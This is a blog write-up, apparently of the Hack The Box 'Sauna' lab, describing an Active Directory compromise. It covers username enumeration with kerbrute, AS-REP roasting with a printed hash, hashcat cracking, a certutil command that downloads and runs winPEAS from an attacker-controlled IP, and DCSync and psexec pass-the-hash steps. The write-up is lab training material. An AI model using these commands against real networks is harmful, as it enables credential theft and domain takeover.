---
layout: post
title: "[HTB] Sauna Writeup"
slug: "active"
date: "2024-04-11"
comments: false
categories:
  - hacking
tags:
  - write up
  - hack the box
  - active directory
---

**IP**: 10.10.10.175
### Enumeration
```bash
> nmap -sCV -v 10.10.10.175
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0 
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-11 20:19:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Domain: EGOTISTICAL-BANK.LOCAL
We have ldap, rpc, smb
We can see that the host is in an Active Directory system and we also have a web server.

Try anonymous login on:
###### SMBClient
![](/images/sauna/smbclient.png)

We have anonymous login but no shares accessible.
###### rpcclient
![](/images/sauna/rpcclient.png)

No access in rpcclient either.
###### ldap
```bash
> ldapsearch -H ldap://10.10.10.175 -x -b "DC=EGOTISTICAL-BANK,DC=LOCAL" 	
```

We get nothing from ldap either. We need to enumerate for users.
###### Web
![](/images/sauna/http.png)

On enumerating the website, we can conclude that it's just a static web page and no entrypoints besides collection of employee names.

![](/images/sauna/employees.png)

Let's create a username wordlist from the employees.
```bash
> cat users.txt
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
> ./username-anarchy --input-file users.txt --select-format first,flast,first.last,firstl,f.last > unames.txt
> cat unames.txt
fergus
fergus.smith
f.smith
fsmith
shaun
shaun.coins
s.coins
scoins
hugo
hugo.bear
h.bear
hbear
bowie
bowie.taylor
b.taylor
btaylor
sophie
sophie.driver
s.driver
sdriver
steven
steven.kerb
s.kerb
skerb
```

Now lets try kerbrute on server to get valid usernames.
```bash
> $(which kerbrute) -users unames.txt -dc-ip 10.10.10.175 -domain EGOTISTICAL-BANK.local  
Impacket v0.11.0 - Copyright 2023 Fortra
[*] Valid user => fsmith [NOT PREAUTH]
[*] No passwords were discovered :'(
```

`fsmith` is a valid user and it has `[NOT PREAUTH]` so it is AS-REP roastable.

```bash
> GetNPUsers.py EGOTISTICAL-BANK.LOCAL/fsmith -dc-ip 10.10.10.175 -request -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:eeee162ca572de2e4518f32f34361c67$906c8bab9e938b45565b521d24c913aa1892f402cdbce9941eaf42072269686cd7649e193069e670a8de8349d8ef335f8fa9afd06d1b2bb85f059e0ab26d84c75acd80816a00bf332f08d30824716ea41c1404e5b8a539aafbd4c65e6c5a28bf40f67e1a3f09b4825777cd8780b8166a464beb9cbe0a573f524ad7401b8185637820cc71e77bc96c71c089a7bc84b78eb521216cf56e2b9c37a6009eb97767fda4b1ad9cddb0234358563c094dbc8b639ac92c2ea0d740b99f7fe95a2f5fb5ae64828e7baed35fa49f29798a10061cb8e6713da1f0dca78b9c325d013d8df2e76855ae4c6f32afa44f4468d666c84c55edd543eed5364d7bf33f5168164911ce
```

Crack the hash with hashcat. 
```bash
> hashcat -m 18200 hash.txt rockyou.txt
```

We now have valid credentials.

**Using rpcclient with the valid creds**
![](/images/sauna/rpcclient_fsmith.png)

**We can also login using evil-winrm**
![](/images/sauna/evil_winrm.png)

We now have user.
###### Searching for privelage escalation

Let us upload winpeas to the server and use it to search for privilege escalation vectors.
```bash
evil-winrm > Cert-Util.exe -urlcache -f http://10.10.16.19:6969/winPEAS.ps1 winPEAS.ps1
evil-winrm > powershell .\winPEAS.ps1
```

We have found valid credentials for a service account.

![](/images/sauna/win_logon.png)

Let us try logging in into that account. 

![](/images/sauna/loan_mgr.png)

Let's use bloodhound on the host.
The user `svc_loanmgr` has `DCSync` privilege on the domain and it can be used to get the hash of another user such as administrator.

![](/images/sauna/dcsync.png)

We use `impacket secretsdump.py` to dump hashes.

![](/images/sauna/secrets_dump.png)

Next, we use `impacket psexec.py` with our dump hash to get admin access.

![](/images/sauna/psexec.png)

Machine has been pwned.

![](/images/sauna/pwned.png)